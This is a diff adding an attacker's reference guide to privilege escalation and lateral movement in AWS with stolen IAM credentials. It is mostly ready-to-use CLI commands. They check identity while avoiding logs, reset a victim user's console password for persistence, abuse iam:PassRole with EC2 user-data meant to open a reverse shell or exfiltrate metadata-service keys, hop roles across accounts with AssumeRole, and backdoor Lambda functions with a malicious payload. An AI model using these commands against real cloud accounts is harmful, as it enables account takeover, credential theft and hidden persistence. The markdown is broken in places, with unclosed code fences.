@@ -1,0 +1,51 @@
+# AWS Privilege Escalation & Lateral Movement
+
+A reference guide for moving laterally through an AWS environment and escalating privileges using compromised IAM credentials.
+
+## 1. Initial Access Validation
+Before making noise, silently validate who you are and what you can do.
+```bash
+# Who am I? (Does not log to CloudTrail in most configurations)
+aws sts get-caller-identity
+
+# Enumerate attached policies
+aws iam list-attached-user-policies --user-name <TARGET_USER>
+aws iam list-user-policies --user-name <TARGET_USER>
+2. Console Access Persistence
+If you only have CLI keys, you can force Web Console access by updating the login profile, assuming you have iam:CreateLoginProfile or iam:UpdateLoginProfile permissions.
+
+Bash
+# Set a new console password for a compromised user account
+aws iam update-login-profile \
+  --user-name <TARGET_USER> \
+  --password 'Pwn3dPassword123!' \
+  --password-reset-required
+3. High-Value Lateral Movement Vectors
+A. The iam:PassRole Exploit (EC2)
+If your compromised user has iam:PassRole and ec2:RunInstances, you can spawn a new EC2 machine, attach a highly privileged IAM Role (like an Administrator role) to it, and log into the instance to extract the temporary admin credentials via the metadata service (169.254.169.254).
+
+Bash
+# 1. Create a bash script (userdata.sh) that creates a reverse shell or exfiltrates keys.
+# 2. Launch the instance and pass the target admin role to it.
+aws ec2 run-instances \
+  --image-id ami-0abcdef1234567890 \
+  --instance-type t2.micro \
+  --iam-instance-profile Name="TargetAdminRole" \
+  --user-data file://userdata.sh
+B. STS AssumeRole Hopping
+If your user has permissions to assume other roles, you can jump to higher privilege levels or cross into other AWS accounts (Cross-Account lateral movement).
+
+Bash
+# Assume the target role
+aws sts assume-role \
+  --role-arn arn:aws:iam::123456789012:role/TargetRole \
+  --role-session-name JerichoHop
+(Take the output AccessKeyId, SecretAccessKey, and SessionToken, and feed them into console_federator.py for immediate console access as that role).
+
+C. Lambda Code Injection (lambda:UpdateFunctionCode)
+If you can update Lambda functions, you can backdoor existing serverless architecture to extract environment variables or act as a persistence mechanism.
+
+Bash
+aws lambda update-function-code \
+  --function-name target-function \
+  --zip-file fileb://malicious_payload.zip
